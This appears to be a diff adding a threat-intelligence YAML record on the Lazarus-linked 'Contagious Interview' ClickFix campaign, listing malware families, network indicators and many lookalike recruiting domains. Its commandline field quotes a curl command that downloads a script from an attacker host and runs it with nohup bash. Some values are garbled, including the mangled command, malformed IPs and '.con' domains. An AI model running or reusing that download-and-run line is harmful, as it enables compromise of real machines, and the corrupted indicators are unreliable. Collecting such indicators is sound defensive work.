@@ -1,0 +1,267 @@
+title: Contagious Interview Campaign Using ClickFix Technique
+description: The report contains information on various domains and IP addresses related
+  to the Willo platform, potentially used for malicious activities.
+attribution: Lazarus Group
+malware_families:
+- BeaverTail
+- InvisibleFerret
+- CivetQ
+- BeaverBackdoor
+- null
+TTPs:
+  processes:
+  - npm
+  - node
+  commandline:
+  - curl -k -o /var/tmp/ffmpeg.sh https://api.nvidia-release.org/TfmpCurl -k o /var/tmp/TTmpeg.
+    sh NEcps//7api. org/FTpeg]a.<h & chiad +x /var/tmp/ TTwpeg.sh &6 nohup bash /var/tmp/Tmpeg-sh
+    ~/dev/null 2>&1 &
+  powershell: null
+  scripting_engine:
+  - curl command for downloading malicious script
+  registry_keys: null
+  image_load: null
+  network_connections:
+  - process->23.254.244.74->80
+  - process->23.254.244.74->443
+  - process: npm
+    destination: api.nvidia-release.org
+    port: 443
+  - process: N/A
+    destination: 152.89.61.240
+    port: N/A
+  - process: N/A
+    destination: 190.97.166.164
+    port: N/A
+  - process: N/A
+    destination: 142.11.216.197
+    port: N/A
+  - process: N/A
+    destination: 104.168.176.127
+    port: N/A
+  - process: N/A
+    destination: 156.67.75.46
+    port: N/A
+  - process: N/A
+    destination: 18.67.30.1
+    port: N/A
+  - process: N/A
+    destination: 190.67.166.164
+    port: N/A
+  - process: N/A
+    destination: www.atdfinancial.com
+    port: N/A
+  - process: N/A
+    destination: jobinterviewguide.org
+    port: N/A
+  - process: N/A
+    destination: talentassesspro.con
+    port: N/A
+  - process: N/A
+    destination: kulsaf2asde.com
+    port: N/A
+  - process: N/A
+    destination: meil.digitpotalent.con
+    port: N/A
+  - process: N/A
+    destination: wwor.intervievhub.org
+    port: N/A
+  file_activity:
+  - /var/tmp/ffmpeg.sh
+  persistence: null
+  process_relations: null
+IOCs:
+  hashes: null
+  ip_addresses:
+  - 23.254.244.74
+  - 152.89.61.240
+  - 190.97.166.164
+  - 142.11.216.197
+  - 104.168.176.127
+  - 156.67.75.46
+  - 18.67.30.1
+  - 45.27956O
+  - 45.27856
+  - 45.27956
+  domains:
+  - web.videoscreening.org
+  - videoscreening.org
+  - app.videoscreening.org
+  - www.intervu-talent.pro
+  - www.talentassesspro.com
+  - www.app.videoforrecruitment.com
+  - videoforrecruitment.com
+  - app.videoforrecruitment.com
+  - blockchain-assess.com
+  - www.app.willotalents.org
+  - willotalents.org
+  - app.willotalents.org
+  - app.willocandidate.com
+  - webmail.complexassess.com
+  - webdisk.complexassess.com
+  - cpcontacts.complexassess.com
+  - cpcalendars.complexassess.com
+  - cpanel.complexassess.com
+  - complexassess.com
+  - autodiscover.complexassess.com
+  - robinhood.vinterview.org
+  - www.app.vinterview.org
+  - app.vinterview.org
+  - app.willotalentes.com
+  - www.api.wtalents.us
+  - api.wtalents.us
+  - cpanel.wtalents.us
+  - willoassessment.com
+  - www.gemini-willoassessment.com
+  - gemini-willoassessment.com
+  - hiring.willoassessment.com
+  - www.consensys.willoassessment.com
+  - geminiskill.willoassessment.com
+  - www.hiring.willoassessment.com
+  - api.willoassessment.com
+  - gemini.willoassessment.com
+  - consensys.willoassessment.com
+  - www.gemini.willoassessment.com
+  - www.app.willotalent.xyz
+  - app.willotalent.xyz
+  - www.api.nvidia-release.us
+  - api.nvidia-release.us
+  - www.willorecruit.com
+  - cpcontacts.willorecruit.com
+  - cpcalendars.willorecruit.com
+  - www.app.willorecruit.com
+  - app.willorecruit.com
+  - webmail.willorecruit.com
+  - mail.willorecruit.com
+  - cpanel.willorecruit.com
+  - webdisk.willorecruit.com
+  - willotalentes.com
+  - www.app.willotalentes.com
+  - willocandidates.com
+  - www.fundcandidates.com
+  - app.willohiring.com
+  - www.willocandidate.com
+  - api.nvidia-release.org
+  - www.willotalent.us
+  - app.willotalent.us
+  - willotalent.us
+  - www.willotalent.pro
+  - app.willotalent.pro
+  - willotalent.pro
+  - www.willointerview.com
+  - www.willoassess.com
+  - www.talent.willoassess.com
+  - www.tal.willoassess.com
+  - www.gemini.willoassess.com
+  - gemini.willoassess.com
+  - willoassess.com
+  - www.willohiring.com
+  - www.app.willohiring.com
+  - www.gemini.willohiring.com
+  - gemini.willohiring.com
+  - www.meta.willohiring.com
+  - meta.willohiring.com
+  - willohiring.com
+  - www.willohiringtalent.org
+  - www.app.willohiringtalent.org
+  - app.willohiringtalent.org
+  - www.gemini.willohiringtalent.org
+  - gemini.willohiringtalent.org
+  - willohiringtalent.org
+  - www.willoassess.org
+  - www.willo-interview.us
+  - www.talent.willo-interview.us
+  - talent.willo-interview.us
+  - www.app.willo-interview.us
+  - app.willo-interview.us
+  - willo-interview.us
+  - www.intro-crypto-assess.com
+  - cpcontacts.intro-crypto-assess.com
+  - cpcalendars.intro-crypto-assess.com
+  - webmail.intro-crypto-assess.com
+  - mail.intro-crypto-assess.com
+  - cpanel.intro-crypto-assess.com
+  - webdisk.intro-crypto-assess.com
+  - intro-crypto-assess.com
+  - www.blockchain-assess.com
+  - d20zx0lguyxj2p.cloudfront.net
+  - d1yzmjg018adwf.cloudfront.net
+  - d12rlkj8v5mwse.cloudfront.net
+  - d3o9p0hkd7eul5.cloudfront.net
+  - wilio-talent.net
+  - willoassess.net
+  - www.wtalents.us
+  - app.wtalents.us
+  - mail.wtalents.us
+  - wtalents.us
+  - www.willomexcvip.us
+  - app.willomexcvip.us
+  - mail.willomexcvip.us
+  - werhiring.willomexcvip.us
+  - willomexcvip.us
+  - www.hiringtalent.pro
+  - app.hiringtalent.pro
+  - final.hiringtalent.pro
+  - hiringtalent.pro
+  - intervu-talent.pro
+  - www.talentcompetency.com
+  - talentcompetency.com
+  - www.app.willoassessment.com
+  - app.willoassessment.com
+  - www.geminiskill.willoassessment.com
+  - www.api.willoassessment.com
+  - www.wilo-talent.com
+  - app.wilo-talent.com
+  - wilo-talent.com
+  - www.complexassess.com
+  - mail.complexassess.com
+  - www.app.willoassess.com
+  - app.willoassess.com
+  - www.vid.willoassess.com
+  - vid.willoassess.com
+  - www.robinhood.intro-crypto-assess.com
+  - www.vid.intro-crypto-assess.com
+  - vid.intro-crypto-assess.com
+  - www.app.blockchain-assess.com
+  - app.blockchain-assess.com
+  - www.vid.blockchain-assess.com
+  - vid.blockchain-assess.com
+  - fundcandidates.com
+  - www.app.blockchain-checkup.com
+  - app.blockchain-checkup.com
+  - talentassesspro.com
+  - www.willo-video.com
+  - willo-video.com
+  - www.robinhood.vinterview.org
+  - vinterview.org
+  - www.hiringinterview.org
+  - www.app.hiringinterview.org
+  - app.hiringinterview.org
+  - hiringinterview.org
+  - www.interviewnest.org
+  - www.app.interviewnest.org
+  - app.interviewnest.org
+  - interviewnest.org
+  - willoassess.org
+  - www.app.videoscreening.org
+  - www.web.videoscreening.org
+  - willovideorec.com
+  - api.nvidia-release.org
+  - willointerview.com
+  - www.atdfinancial.com
+  - jobinterviewguide.org
+  - talentassesspro.con
+  - kulsaf2asde.com
+  - meil.digitpotalent.con
+  - wwor.intervievhub.org
+  - willointerview.con
+  - willoassess.con
+  - wemtoluillosssess.con
+  - wew.app.willosssess.con
+  urls:
+  - hxxps://www.vid.willoassess[.]com/video-questions/create/531fbaedf67046d6904478f15d3e7142
+authors:
+- Efstratios Lontzetidis
+reference: https://www.validin.com/blog/inoculating_contagious_interview_with_validin
+date_of_publication: January 16, 2025
+file_creation_date: April 05, 2026
